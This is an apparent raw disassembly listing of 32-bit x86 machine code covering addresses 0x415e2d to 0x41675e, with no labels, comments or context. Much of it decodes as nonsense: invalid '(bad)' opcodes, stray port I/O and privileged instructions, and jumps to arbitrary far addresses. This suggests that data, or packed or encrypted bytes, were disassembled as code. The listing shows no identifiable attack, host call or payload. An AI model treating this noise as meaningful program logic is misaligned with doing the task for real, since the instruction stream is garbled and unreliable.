  415e2d:	rcr    edi,cl
  415e2f:	or     al,0x10
  415e31:	sbb    bh,ch
  415e33:	fidiv  WORD PTR [ecx+0x46]
  415e36:	out    0x95,al
  415e38:	or     eax,0x8c44d569
  415e3d:	adc    al,0xc3
  415e3f:	or     ah,bh
  415e41:	xchg   esp,eax
  415e42:	mov    bl,0xd
  415e44:	add    eax,0xc1ff5491
  415e49:	ror    DWORD PTR [eax],cl
  415e4b:	jmp    0xd9f46ee0
	...
  415e64:	pop    edx
  415e65:	dec    eax
  415e66:	cmc    
  415e67:	stos   BYTE PTR es:[edi],al
  415e68:	push   cs
  415e69:	dec    esp
  415e6a:	adc    BYTE PTR [ebp+0x1389d34d],bl
  415e70:	pop    ds
  415e71:	cdq    
  415e72:	test   bl,dl
  415e74:	cmp    cl,BYTE PTR [eax-0xb]
  415e77:	je     0x415e7d
  415e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7a:	cmc    
  415e7b:	(bad)  
  415e7c:	jmp    0x90223f65
  415e81:	xchg   esp,eax
  415e82:	or     BYTE PTR [esi-0x2a801447],cl
  415e88:	mov    bl,0x52
  415e8a:	add    cl,ch
  415e8c:	mov    ds:0xdc68eb0d,al
  415e91:	adc    al,0x8
  415e93:	jmp    0x1ea04227
  415e98:	add    eax,0x836c00d2
  415e9d:	adc    al,0xaf
  415e9f:	(bad)  [edi-0x329ff76c]
  415ea5:	adc    ecx,eax
  415ea7:	in     eax,dx
  415ea8:	add    al,0x84
  415eaa:	xchg   DWORD PTR [edi-0x160b6b70],eax
  415eb0:	into   
  415eb1:	cs push cs
  415eb3:	bound  esi,QWORD PTR [ebp-0x3b]
  415eb6:	in     eax,dx
  415eb7:	test   eax,0xa8089481
  415ebc:	jno    0x415e58
  415ebe:	push   DWORD PTR [esi+0x15]
  415ec1:	mov    WORD PTR [edi-0xb6b6f7a],es
  415ec7:	jmp    0x415ecc
	...
  415edc:	dec    esi
  415edd:	aaa    
  415ede:	add    dh,al
  415ee0:	dec    ecx
  415ee1:	or     eax,0x131a603a
  415ee6:	retf   0x4e5
  415ee9:	mov    WORD PTR [edi+0x350c200],es
  415eef:	add    BYTE PTR ds:0x2e06e352,dh
  415ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ef6:	lea    edi,[esi]
  415ef8:	scas   al,BYTE PTR es:[edi]
  415ef9:	mov    ds:0x6125e675,eax
  415efe:	pop    es
  415eff:	add    BYTE PTR [esi+ebp*1+0x4],dh
  415f03:	mov    ebx,DWORD PTR [esi]
  415f05:	adc    al,0xe7
  415f07:	aas    
  415f08:	xor    ebx,DWORD PTR fs:[eax]
  415f0b:	or     DWORD PTR [ebx+0x1b],ebp
  415f0e:	adc    BYTE PTR [ecx+0x3f89096],al
  415f14:	cmc    
  415f15:	push   ecx
  415f16:	fild   WORD PTR [esp+ebp*8]
  415f19:	push   es
  415f1a:	lea    esi,[edx]
  415f1c:	jl     0x415f22
  415f1e:	xchg   edx,eax
  415f20:	icebp  
  415f21:	sbb    edi,DWORD PTR [eax]
  415f23:	adc    ebx,0xffffffa7
  415f26:	push   DWORD PTR [edx]
  415f28:	ins    BYTE PTR es:[edi],dx
  415f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f2a:	dec    ebp
  415f2b:	and    DWORD PTR ds:0x80c9898d,0xe
  415f32:	add    DWORD PTR [ebp+0x35],0xa527e081
  415f39:	nop
  415f3a:	or     BYTE PTR [edi+0x4b],bl
  415f3d:	mov    ecx,DWORD PTR [ebp+0xec]
	...
  415f53:	add    BYTE PTR [eax+0x52],ch
  415f56:	or     al,0x0
  415f58:	cs int 0x2c
  415f5b:	add    al,0x3f
  415f5d:	fnstsw WORD PTR [ecx+eax*2-0x5b]
  415f61:	sbb    eax,DWORD PTR [edx]
  415f63:	mov    DWORD PTR [ebp+0x15],edi
  415f66:	retf   0xf604
  415f69:	push   edi
  415f6a:	or     al,0x81
  415f6c:	jmp    FWORD PTR [ebx+0x7c]
  415f6f:	inc    ecx
  415f70:	gs out 0xe6,al
  415f73:	ret    0x9871
  415f76:	jg     0x415fbc
  415f78:	mov    WORD PTR [ecx+0x69e0ba00],ss
  415f7e:	dec    edx
  415f7f:	add    BYTE PTR [edi],al
  415f81:	inc    esi
  415f82:	or     BYTE PTR [edx],0xf
  415f85:	outs   dx,BYTE PTR ds:[esi]
  415f86:	or     eax,0x8a324e81
  415f8b:	cli    
  415f8c:	inc    eax
  415f8d:	or     cl,BYTE PTR [edx+0x0]
  415f90:	mov    esi,0x8c04c7ab
  415f95:	or     BYTE PTR [edx+0x37fdbce3],al
  415f9b:	mov    ecx,edx
  415f9d:	xor    eax,0xc8805b80
  415fa2:	ds clc 
  415fa4:	pop    esi
  415fa5:	sbb    eax,0x2d8c1de1
  415faa:	or     DWORD PTR [eax-0x80],ebp
  415fad:	leave  
  415fae:	dec    edx
  415faf:	add    BYTE PTR [ecx],al
  415fb1:	jno    0x415f87
  415fb3:	push   eax
  415fb4:	hlt    
  415fb5:	add    al,0xc
	...
  415fcb:	add    BYTE PTR [esi+edi*2+0x7dd4437f],cl
  415fd2:	in     al,0x70
  415fd4:	mov    WORD PTR ds:0x52155909,gs
  415fda:	das    
  415fdb:	ret    0x2d94
  415fde:	mov    DWORD PTR ds:[eax-0x67],edx
  415fe2:	add    al,0x89
  415fe4:	pop    eax
  415fe5:	push   ecx
  415fe6:	or     eax,0x16dcd87
  415feb:	mov    dh,0x95
  415fed:	in     al,dx
  415fee:	jmp    0x4cbf:0x84380518
  415ff5:	dec    edx
  415ff6:	xchg   edi,eax
  415ff7:	pop    es
  415ff8:	dec    ebp
  415ff9:	or     al,0xfc
  415ffb:	or     BYTE PTR [esi+0x4d8706b4],dl
  416001:	ins    DWORD PTR es:[edi],dx
  416002:	add    DWORD PTR [esi-0x1adf6b7b],esi
  416008:	xchg   esp,eax
  416009:	(bad)  
  41600a:	stc    
  41600b:	mov    WORD PTR [esi+0x4e87300d],ss
  416011:	cwde   
  416012:	push   0x7593ccc7
  416017:	call   DWORD PTR [edx-0x333a8763]
  41601d:	xchg   ebx,eax
  41601e:	jne    0x41602d
  416020:	sti    
  416021:	xor    al,0xd7
  416023:	mov    WORD PTR [esi-0x66bbdff3],es
  416029:	or     bh,al
  41602b:	les    eax,FWORD PTR [ebx-0x5c]
  41602e:	jmp    0x0:0xd
	...
  416041:	add    BYTE PTR [eax],al
  416043:	add    BYTE PTR [ebx],dl
  416045:	mov    gs,WORD PTR [eax-0x3b]
  416048:	int3   
  416049:	xchg   ebx,eax
  41604a:	xor    eax,0xf7354b0d
  41604f:	push   cs
  416050:	xchg   esi,eax
  416051:	xchg   ebx,eax
  416052:	xor    eax,0x68559304
  416057:	push   cs
  416058:	push   ebp
  416059:	push   esi
  41605a:	test   DWORD PTR [ebx],0x203b0f3d
  416060:	xchg   esp,eax
  416061:	movntps XMMWORD PTR [eax],xmm4
  416064:	mov    BYTE PTR [edi],cl
  416066:	loope  0x41602c
  416068:	in     al,0x9b
  41606a:	ja     0x416070
  41606c:	mov    ecx,DWORD PTR [edi]
  41606e:	loope  0x416034
  416070:	mov    ah,0xa3
  416072:	addr16 add al,0x7b
  416075:	psraw  mm0,mm4
  416078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416079:	mov    esi,DWORD PTR [edi+0x4]
  41607c:	imul   ecx,DWORD PTR ds:0x640b44ba,0x62
  416083:	lds    edx,FWORD PTR [eax-0x727420f1]
  416089:	psraw  mm0,mm4
  41608c:	je     0x41602b
  41608e:	ja     0x416094
  416090:	ret    
  416091:	or     eax,0x2d50eb08
  416096:	sbb    BYTE PTR [ecx-0x78],ah
  416099:	add    DWORD PTR [ecx+0x2d50eb],0x81818871
  4160a3:	sti    
  4160a4:	pop    es
  4160a5:	gs sub al,0x0
	...
  4160b9:	add    BYTE PTR [eax],al
  4160bb:	add    BYTE PTR [edx+0x7ce90056],dl
  4160c1:	sbb    ebx,ebp
  4160c3:	push   0x2b
  4160c5:	xchg   ecx,eax
  4160c6:	pop    ecx
  4160c7:	lahf   
  4160c8:	jle    0x4160d5
  4160ca:	dec    ebx
  4160cb:	fld    QWORD PTR [edx]
  4160cd:	out    0x0,al
  4160cf:	jb     0x4160f2
  4160d1:	or     eax,0xda12f143
  4160d6:	or     al,0x60
  4160d8:	loop   0x4160db
  4160da:	loope  0x4160c1
  4160dc:	js     0x416129
  4160de:	xchg   DWORD PTR [edx],ecx
  4160e0:	xchg   esi,eax
  4160e1:	pop    DWORD PTR ds:0x7f6998ee
  4160e7:	pop    ss
  4160e8:	sar    BYTE PTR [edx],1
  4160ea:	or     al,0xb8
  4160ec:	fstp   DWORD PTR [ecx]
  4160ee:	fisubr WORD PTR [eax-0x50c85b0a]
  4160f4:	pop    ss
  4160f5:	inc    esp
  4160f6:	xchg   edx,ecx
  4160f8:	mov    ch,0x3f
  4160fa:	or     cl,ch
  4160fc:	jle    0x416167
  4160fe:	jg     0x4160a7
  416100:	iret   
  416101:	cmp    bl,BYTE PTR [eax]
  416103:	clc    
  416104:	fstp   DWORD PTR [ecx]
  416106:	(bad)  
  416107:	test   al,0xa6
  416109:	xchg   esi,eax
  41610a:	aaa    
  41610b:	xchg   edi,eax
  41610c:	pop    es
  41610d:	inc    esp
  41610e:	xchg   DWORD PTR [edx-0x25c67c7f],ecx
  416114:	jle    0x416174
  416116:	jg     0x4160cf
  416118:	iret   
  416119:	cmp    cl,BYTE PTR [edx]
  41611b:	fdivr  DWORD PTR [esi+0xc619]
	...
  416131:	add    BYTE PTR [eax],al
  416133:	add    BYTE PTR [esi+ebp*1],dh
  416136:	add    BYTE PTR [ecx],dh
  416138:	sbb    ecx,DWORD PTR ds:0x5b0681f7
  41613e:	or     bh,bh
  416140:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  416142:	ror    BYTE PTR [ecx+0x8ee55d3],cl
  416148:	test   BYTE PTR [esi-0x73],cl
  41614b:	jne    0x41610e
  41614d:	xchg   ebp,eax
  41614e:	dec    BYTE PTR [ebx-0x104a96c0]
  416154:	xor    bl,BYTE PTR [eax]
  416156:	jmp    0x416159
  416158:	mov    esp,0xacf90d65
  41615d:	push   es
  41615e:	and    eax,0x7567acce
  416163:	jecxz  0x416124
  416165:	repnz mov eax,ds:0x24ff44aa
  41616b:	fnstenv [eax+0x5a891aa4]
  416171:	push   ebp
  416172:	jecxz  0x416193
  416174:	jbe    0x4161a9
  416176:	cmc    
  416177:	mov    BYTE PTR [edi],al
  416179:	mov    ?,edx
  41617b:	(bad)  
  41617c:	sub    BYTE PTR [ebp+0x0],bl
  41617f:	add    ch,ah
  416181:	xchg   esp,eax
  416182:	(bad)  
  416183:	into   
  416184:	xor    al,0x33
  416186:	adc    al,0x89
  416188:	xor    dl,BYTE PTR [esi-0x1d]
  41618b:	add    al,0x6c
  41618d:	push   0x536cfb0d
  416192:	xchg   eax,eax
  416194:	mov    ecx,0x8916a7
	...
  4161a9:	add    BYTE PTR [eax],al
  4161ab:	add    BYTE PTR [ebx],ah
  4161ad:	sbb    dh,ch
  4161af:	aas    
  4161b0:	cs xchg ecx,eax
  4161b2:	mov    ecx,0x8d561f4
  4161b7:	mov    edx,edx
  4161b9:	push   ebp
  4161ba:	jecxz  0x4161c2
  4161bc:	xor    al,0x34
  4161be:	hlt    
  4161bf:	add    BYTE PTR [ebx+ebp*1+0x26db0909],cl
  4161c6:	push   ebx
  4161c7:	aas    
  4161c8:	mov    esp,es
  4161ca:	mov    al,0xbf
  4161cc:	jae    0x4161fe
  4161ce:	mov    ah,ch
  4161d0:	js     0x416200
  4161d2:	or     DWORD PTR [eax],eax
  4161d4:	xchg   DWORD PTR [esi+0x2dcd78c5],eax
  4161da:	sbb    ch,0x4d
  4161dd:	iret   
  4161de:	idiv   DWORD PTR [esi+0x73]
  4161e1:	jmp    0xf498:0x328c0009
  4161e8:	ret    0x8ec
  4161eb:	xchg   DWORD PTR [ecx+0xfc68289],edi
  4161f1:	outs   dx,BYTE PTR ds:[esi]
  4161f2:	cmc    
  4161f3:	xchg   BYTE PTR [edi+0x3b],al
  4161f6:	out    dx,eax
  4161f7:	xchg   BYTE PTR [edx-0x55],cl
  4161fa:	out    0x3d,eax
  4161fc:	pop    ss
  4161fd:	push   0xffffff86
  4161ff:	hlt    
  416200:	cdq    
  416201:	in     al,dx
  416202:	or     BYTE PTR [ecx],cl
  416204:	cdq    
  416205:	test   eax,0xa6cddd82
  41620a:	pop    es
  41620b:	jg     0x4161f8
  41620d:	inc    ecx
  41620e:	or     al,BYTE PTR [eax]
	...
  416224:	mov    WORD PTR [edx],?
  416226:	cwde   
  416227:	hlt    
  416228:	ja     0x416216
  41622a:	or     BYTE PTR [edi+0xeececcb],al
  416230:	or     eax,0x8c00d057
  416235:	sub    eax,0xe4d8b502
  41623a:	dec    ebx
  41623b:	add    BYTE PTR ds:0x9aedcaf7,dl
  416241:	lods   al,BYTE PTR ds:[esi]
  416242:	aad    0xfc
  416244:	mov    WORD PTR ds:0x9fb0909,gs
  41624a:	inc    ebp
  41624b:	aas    
  41624c:	mov    WORD PTR [eax+edx*8-0x5f98f42f],ss
  416253:	fidivr WORD PTR [eax+0xd]
  416256:	mov    dh,0xc5
  416258:	mov    eax,ds:0x93d36898
  41625d:	cmp    edi,DWORD PTR [eax-0x42]
  416260:	or     eax,0x9a12eb54
  416265:	or     eax,0x7f6a839d
  41626a:	push   0x10
  41626c:	pop    ds
  41626d:	dec    eax
  41626e:	jmp    0x4162b4
  416270:	mov    WORD PTR ds:0x9669c536,cs
  416276:	pusha  
  416277:	fist   WORD PTR [eax-0x6c]
  41627a:	fild   WORD PTR [ebx]
  41627c:	xchg   ebp,eax
  41627d:	pop    es
  41627e:	xor    ebx,DWORD PTR [edx-0x7d]
  416281:	xchg   esp,eax
  416282:	js     0x41623b
  416284:	sti    
  416285:	cs in  eax,dx
  416287:	test   BYTE PTR [eax],al
	...
  416299:	add    BYTE PTR [eax],al
  41629b:	add    BYTE PTR [ecx],ch
  41629d:	inc    eax
  41629e:	fild   WORD PTR [ebx]
  4162a0:	mov    WORD PTR [ebx-0x2a5b2faa],cs
  4162a6:	fisttp WORD PTR [ecx+edi*1-0x6d11f1ab]
  4162ad:	aaa    
  4162ae:	add    eax,DWORD PTR [esp+ecx*4]
  4162b1:	xchg   esp,eax
  4162b2:	cli    
  4162b3:	mov    ?,eax
  4162b5:	lds    esp,FWORD PTR [eax-0xc36ecfd]
  4162bb:	mov    edx,cs
  4162bd:	adc    bl,BYTE PTR [edi]
  4162bf:	add    BYTE PTR [ebx],dl
  4162c1:	arpl   WORD PTR [edx],dx
  4162c3:	test   BYTE PTR [edx],0x5e
  4162c6:	(bad)  
  4162c7:	fstp   QWORD PTR [ecx-0x276eecf5]
  4162cd:	shl    BYTE PTR [eax],0x4
  4162d0:	xchg   ebp,eax
  4162d1:	leave  
  4162d2:	mov    bl,0x8c
  4162d4:	loope  0x41632a
  4162d6:	(bad)  
  4162d7:	std    
  4162d8:	cmp    dh,BYTE PTR [edi]
  4162da:	or     BYTE PTR [ebp-0x1df76b71],dh
  4162e0:	sbb    cl,BYTE PTR [eax+0x71]
  4162e3:	sub    BYTE PTR [eax-0x4d572ae9],cl
  4162e9:	lea    eax,[edi+0x893bb8e]
  4162ef:	jmp    0x13d6a8a
  4162f4:	leave  
  4162f5:	xchg   esp,eax
  4162f6:	jg     0x416296
  4162f8:	push   eax
  4162f9:	xor    BYTE PTR [esi],bl
  4162fb:	push   0xe9084152
	...
  416314:	(bad)  
  416315:	mov    edi,DWORD PTR [ebp+0x87dd25d]
  41631b:	sbb    BYTE PTR [ecx+0x40],al
  41631e:	inc    ebx
  41631f:	push   ecx
  416320:	push   cs
  416321:	mov    edx,0x1192e9f0
  416326:	mov    eax,ds:0x7f405a47
  41632b:	xor    DWORD PTR [eax+0x35],edx
  41632e:	adc    eax,0xe64e4960
  416333:	pusha  
  416334:	push   eax
  416335:	xchg   esi,eax
  416336:	div    DWORD PTR [eax-0x21]
  416339:	ins    DWORD PTR es:[edi],dx
  41633a:	shl    BYTE PTR [eax+0x4e],0xbe
  41633e:	jmp    0xa22c4886
  416343:	fadd   DWORD PTR [ebp+0x6e]
  416346:	iret   
  416347:	jo     0x416388
  416349:	(bad)  
  41634a:	out    0xde,eax
  41634c:	or     BYTE PTR [edi-0x29],ah
  41634f:	pop    es
  416350:	add    BYTE PTR [ebx-0x1],dl
  416353:	cli    
  416354:	pop    ss
  416355:	gs (bad) 
  416357:	rcl    DWORD PTR [eax-0x328f3f93],1
  41635d:	mov    ebp,0x3f88d6e9
  416362:	or     BYTE PTR [eax],bl
  416364:	pop    es
  416365:	push   ss
  416366:	rol    BYTE PTR [eax],1
  416368:	hlt    
  416369:	cmp    BYTE PTR [eax],al
  41636b:	xor    edi,esp
  41636d:	or     eax,ebx
  41636f:	ror    ebp,0x92
  416372:	and    eax,0x75532cc8
  416377:	jecxz  0x416379
	...
  416389:	add    BYTE PTR [eax],al
  41638b:	add    dh,al
  41638d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41638e:	aaa    
  41638f:	xor    esi,DWORD PTR [edx+edi*8+0x38e4d88c]
  416396:	or     dh,BYTE PTR [ecx]
  416398:	aaa    
  416399:	or     eax,eax
  41639b:	rcr    DWORD PTR ds:0xfcd02648,0x53
  4163a2:	jne    0x416387
  4163a4:	cli    
  4163a5:	or     BYTE PTR [bx+si],al
  4163a8:	and    al,0xfb
  4163aa:	mov    eax,ds
  4163ac:	mov    ah,0x38
  4163ae:	sbb    BYTE PTR [ecx],dh
  4163b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163b1:	or     eax,eax
  4163b3:	ror    ebp,0x94
  4163b6:	and    eax,0x7553acd0
  4163bb:	jecxz  0x4163f7
  4163bd:	cwde   
  4163be:	add    ecx,DWORD PTR [edi]
  4163c0:	xor    al,0xfb
  4163c2:	jle    0x416409
  4163c4:	sub    eax,0x2404e752
  4163c9:	dec    esp
  4163ca:	lea    ebx,[eax]
  4163cc:	mov    dh,0x7d
  4163ce:	add    BYTE PTR [esi+ebx*4],al
  4163d1:	jge    0x4163d3
  4163d3:	mov    DWORD PTR ds:0x6c5b5688,edx
  4163d9:	sub    al,0x51
  4163db:	ret    0x90fd
  4163de:	push   edi
  4163df:	push   esi
  4163e0:	jle    0x41645e
  4163e2:	sub    al,0xc
  4163e4:	add    ecx,DWORD PTR [esp+edi*2]
  4163e7:	and    al,0xc5
  4163e9:	fimul  WORD PTR [ecx-0x3a53250a]
  4163ef:	sldt   WORD PTR [eax]
	...
  416402:	add    BYTE PTR [eax],al
  416404:	add    edx,DWORD PTR [edx+0x3]
  416407:	mov    bh,0x8c
  416409:	jmp    0x416443
  41640b:	mov    ecx,DWORD PTR [edi+0x33]
  41640e:	cmp    eax,ebp
  416410:	pop    ecx
  416411:	push   ecx
  416412:	fdiv   st(5),st
  416414:	and    al,0x7
  416416:	inc    ebp
  416417:	aas    
  416418:	mov    WORD PTR [ebx+0x0],ss
  41641b:	cld    
  41641c:	stos   DWORD PTR es:[edi],eax
  41641d:	in     eax,dx
  41641e:	or     esi,DWORD PTR [ebp-0x17c88366]
  416424:	dec    ebp
  416425:	icebp  
  416426:	(bad)  
  416428:	and    al,0x9f
  41642a:	inc    ebp
  41642b:	aas    
  41642c:	mov    WORD PTR ds:0x1383f9c4,ss
  416432:	cmp    ebx,DWORD PTR [ecx+0x4e]
  416435:	inc    esi
  416436:	or     DWORD PTR [ebx+0x5],edx
  416439:	or     DWORD PTR [ecx],edi
  41643b:	push   eax
  41643c:	mov    edi,0x170836b6
  416441:	push   ecx
  416442:	or     eax,0x37b5c18b
  416447:	push   eax
  416448:	fs icebp 
  41644a:	fdiv   st(5),st
  41644c:	dec    ebx
  41644d:	push   esi
  41644e:	inc    ebp
  41644f:	je     0x41641e
  416451:	sub    eax,0x1e34438e
  416456:	loope  0x41644d
  416458:	xor    BYTE PTR [ebx+0x22068dc],al
  41645e:	dec    edx
  41645f:	add    BYTE PTR [ecx],dl
  416461:	jmp    0xa565b536
  416466:	(bad)  
	...
  41647c:	adc    edx,DWORD PTR [esi]
  41647e:	inc    ebp
  41647f:	jae    0x4164ce
  416481:	sub    eax,0x1e04438e
  416486:	loope  0x416461
  416488:	clc    
  416489:	cmp    bl,cl
  41648b:	push   ecx
  41648c:	add    ecx,ebp
  41648e:	rcl    BYTE PTR [eax-0xc],1
  416491:	scas   eax,DWORD PTR es:[edi]
  416492:	(bad)  
  416494:	jecxz  0x41642a
  416496:	dec    edx
  416497:	jge    0x416481
  416499:	fldenv [ecx+0x68e0d3fc]
  41649f:	jmp    0x37308db1
  4164a4:	pop    edx
  4164a5:	cvttps2pi mm7,xmm4
  4164a8:	add    al,0xc2
  4164aa:	jecxz  0x41642c
  4164ac:	dec    edi
  4164ad:	cmp    al,0xf
  4164af:	aaa    
  4164b0:	mov    ah,0x3e
  4164b2:	mov    edx,0x2409a1d3
  4164b7:	aam    0x3c
  4164b9:	pop    ss
  4164ba:	mov    ds:0x8c2c3cfc,al
  4164bf:	iret   
  4164c0:	mov    DWORD PTR [ebx],edi
  4164c2:	pop    es
  4164c3:	pop    eax
  4164c4:	clc    
  4164c5:	aad    0xdf
  4164c7:	or     bh,0x3c
  4164ca:	paddusb mm3,QWORD PTR [ecx]
  4164cd:	cmp    BYTE PTR [esi-0x2d],bh
  4164d0:	hlt    
  4164d1:	sar    bl,0x44
  4164d4:	mov    WORD PTR [ecx],cs
  4164d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164d7:	sar    DWORD PTR [esp+ebp*1+0x3b51d078],cl
  4164de:	push   0x31
	...
  4164f4:	dec    eax
  4164f5:	shrd   ebx,edx,0xb
  4164f9:	ror    DWORD PTR [ebx+0x7d],1
  4164fc:	xlat   BYTE PTR ds:[ebx]
  4164fd:	inc    esp
  4164fe:	xlat   BYTE PTR ds:[ebx]
  4164ff:	xlat   BYTE PTR ds:[ebx]
  416500:	mov    eax,0xcf80dfd5
  416505:	cmp    al,0x8f
  416507:	(bad)  [ecx-0x5b2cd1c8]
  41650d:	inc    eax
  41650e:	fwait
  41650f:	inc    esp
  416510:	mov    WORD PTR [ecx],cs
  416512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416513:	rcr    DWORD PTR [esp+ebp*1-0x80],cl
  416517:	iret   
  416518:	add    DWORD PTR [ebx],edi
  41651a:	jp     0x41654d
  41651c:	clc    
  41651d:	push   cs
  41651e:	lods   al,BYTE PTR ds:[esi]
  41651f:	ror    DWORD PTR [ebx],cl
  416521:	ror    DWORD PTR [eax],1
  416523:	cmc    
  416524:	push   0x3b81f8df
  416529:	mov    DWORD PTR [edi-0x17],0x39f0d70c
  416530:	mov    al,0xd0
  416532:	hlt    
  416533:	(bad)  
  416534:	fisubr WORD PTR [ebx-0x6bb6ab84]
  41653a:	sub    DWORD PTR [eax+eiz*8],0xffffffe3
  41653e:	loopne 0x416540
  416540:	fdivr  QWORD PTR [eax]
  416542:	cmc    
  416543:	pop    ds
  416544:	or     eax,0xc019f0d7
  416549:	xor    esi,ecx
  41654b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41654c:	mov    esi,0x55f1ce14
  416551:	cmovnp ebx,DWORD PTR [ecx-0x6d26d341]
	...
  41656c:	pop    esi
  41656d:	cmp    BYTE PTR [esi+0x22],dl
  416570:	stc    
  416571:	sub    BYTE PTR [ebx-0x55],dl
  416574:	ja     0x4165b0
  416576:	pop    esp
  416577:	pusha  
  416578:	je     0x416534
  41657a:	in     al,0x5d
  41657c:	mov    BYTE PTR [eax+ecx*1-0x7e206a46],dl
  416583:	mov    esp,0xe57b0d57
  416588:	or     al,0x16
  41658a:	mov    BYTE PTR [edi+0x5e],cl
  41658d:	cmp    BYTE PTR [eax+0x51],bl
  416590:	sbb    al,0x3a
  416592:	cmc    
  416593:	jmp    0x3da1fa69
  416598:	les    edi,FWORD PTR [ecx+0x8]
  41659b:	inc    ecx
  41659c:	cwde   
  41659d:	cmp    dh,ch
  41659f:	and    BYTE PTR es:[esi-0x7e],0x6b
  4165a4:	cmp    eax,esi
  4165a6:	inc    edi
  4165a7:	jmp    0xab7bf633
  4165ac:	or     bh,BYTE PTR [edi]
  4165ae:	add    BYTE PTR [eax],al
  4165b0:	adc    DWORD PTR [ecx-0x35],esp
  4165b3:	test   DWORD PTR ds:0xf4fff364,ecx
  4165b9:	xchg   ebp,eax
  4165ba:	or     BYTE PTR [eax],al
  4165bc:	mov    es,WORD PTR [ecx+0x115cf08d]
  4165c2:	jl     0x4165c2
  4165c4:	mov    dl,0x63
  4165c6:	and    eax,0x7fa0ced2
  4165cb:	test   DWORD PTR [ecx+0x66],ebx
  4165ce:	repz inc DWORD PTR [eax]
	...
  4165e1:	add    BYTE PTR [eax],al
  4165e3:	add    BYTE PTR [ecx+edx*1],bh
  4165e6:	je     0x4165e6
  4165e8:	repnz arpl bx,si
  4165eb:	test   DWORD PTR [ecx+0x66],ebp
  4165ee:	repz jmp FWORD PTR [esi]
  4165f1:	mov    ecx,0x63f2fe74
  4165f6:	add    edi,DWORD PTR [esi+0x7fe810a6]
  4165fc:	out    dx,al
  4165fd:	or     DWORD PTR [esi+edi*8+0x12],esi
  416601:	arpl   WORD PTR [ebx],ax
  416603:	mov    dh,0x52
  416605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416606:	lock mov BYTE PTR [ebx+ecx*2+0x7],ah
  41660b:	add    BYTE PTR [esi+0x6dfa87d2],dh
  416611:	retf   0x8009
  416614:	scas   al,BYTE PTR es:[edi]
  416615:	nop
  416616:	jns    0x4165de
  416618:	sbb    edi,DWORD PTR [ebx-0x20]
  41661b:	imul   esp,ebx,0x63
  41661e:	repz or DWORD PTR [eax],0xffffffc8
  416622:	idiv   bh
  416624:	rcl    BYTE PTR [eax-0x1ddac478],cl
  41662a:	stos   DWORD PTR es:[edi],eax
  41662b:	and    DWORD PTR [eax+0x72fff6c8],0xffffff90
  416632:	jns    0x4165d2
  416634:	mov    al,ds:0x72fe8811
  416639:	arpl   WORD PTR [eax-0x18],bx
  41663c:	mov    WORD PTR [edx],cs
  41663e:	or     al,BYTE PTR [eax]
  416640:	mov    edx,gs
  416642:	ss pop ecx
  416644:	add    eax,0xc2259f
	...
  416659:	add    BYTE PTR [eax],al
  41665b:	add    BYTE PTR [ebx+ebp*1-0x540e78c2],al
  416662:	call   0x96cf3f3
  416667:	push   ecx
  416668:	inc    edx
  416669:	jp     0x4166de
  41666b:	pop    ebx
  41666c:	test   dh,al
  41666e:	pop    esi
  41666f:	or     al,0x19
  416671:	test   al,0x89
  416673:	inc    bl
  416675:	dec    ecx
  416676:	cmp    eax,ebp
  416678:	mov    ebx,0x2600092a
  41667d:	sub    edx,DWORD PTR [ecx-0xc]
  416680:	and    DWORD PTR [esp+ecx*1-0x18],ebp
  416684:	mov    edi,0x5dfdd7e7
  416689:	std    
  41668a:	jb     0x41660e
  41668c:	cwde   
  41668d:	lahf   
  41668e:	dec    ecx
  41668f:	add    BYTE PTR [edx+ebp*1],dl
  416692:	sbb    eax,DWORD PTR [edx+0xf]
  416695:	and    al,0xf9
  416697:	jnp    0x416716
  416699:	out    0x8d,eax
  41669b:	js     0x41670f
  41669d:	mov    bh,0xd8
  41669f:	jmp    FWORD PTR [ebx+0x2e]
  4166a2:	or     ecx,ebp
  4166a4:	mov    eax,0x1187d9b4
  4166a9:	pop    edx
  4166aa:	xlat   BYTE PTR ds:[ebx]
  4166ab:	std    
  4166ac:	push   ebx
  4166ad:	popf   
  4166ae:	mov    esi,0x8eb27ce9
  4166b3:	je     0x4166f7
  4166b5:	(bad)  
  4166b6:	fadd   DWORD PTR [edi-0x228adef]
  4166bc:	xor    esi,DWORD PTR [edi-0x72]
  4166bf:	je     0x4166c1
	...
  4166d1:	add    BYTE PTR [eax],al
  4166d3:	add    BYTE PTR [edx],ch
  4166d5:	jg     0x4166af
  4166d7:	mov    DWORD PTR [ecx],edx
  4166d9:	jmp    0x91fe:0x951bfdd6
  4166e0:	lea    edx,[ebx]
  4166e2:	dec    DWORD PTR [edi+0x15]
  4166e5:	cli    
  4166e6:	call   0xb999:0xd63801d1
  4166ed:	test   DWORD PTR [edi],eax
  4166ef:	jnp    0x4166e4
  4166f1:	push   ecx
  4166f2:	loop   0x4166f7
  4166f4:	dec    ebp
  4166f5:	shl    BYTE PTR [edx-0x33],cl
  4166f8:	jl     0x4166b3
  4166fa:	in     al,dx
  4166fb:	adc    DWORD PTR [ebp+0x3ac65494],0xffffffde
  416702:	xlat   BYTE PTR ds:[ebx]
  416703:	into   
  416704:	(bad)  
  416705:	aaa    
  416706:	fiadd  WORD PTR [ebx-0x303a4311]
  41670c:	mov    ecx,0x8c0b5f94
  416711:	ror    DWORD PTR [esi-0x4243187d],0xcf
  416718:	mov    eax,ds:0x76e3c94
  41671d:	adc    bl,BYTE PTR [edi-0x32]
  416720:	xchg   ecx,eax
  416721:	aaa    
  416722:	das    
  416723:	fdiv   QWORD PTR [ebx]
  416725:	xchg   esp,eax
  416726:	fild   WORD PTR [ebx]
  416728:	loope  0x416700
  41672a:	cmp    bh,BYTE PTR [ebp+0x68]
  41672d:	fldenv [ecx+0x1de273fc]
  416733:	aaa    
  416734:	adc    eax,0xf3c3d0
	...
  416749:	add    BYTE PTR [eax],al
  41674b:	add    cl,ch
  41674d:	or     eax,DWORD PTR [ebx]
  41674f:	sub    BYTE PTR [eax-0x20549b52],al
  416755:	mov    edi,DWORD PTR [eax-0x3a]
  416758:	pop    ss
  416759:	mov    esp,0x950665ef
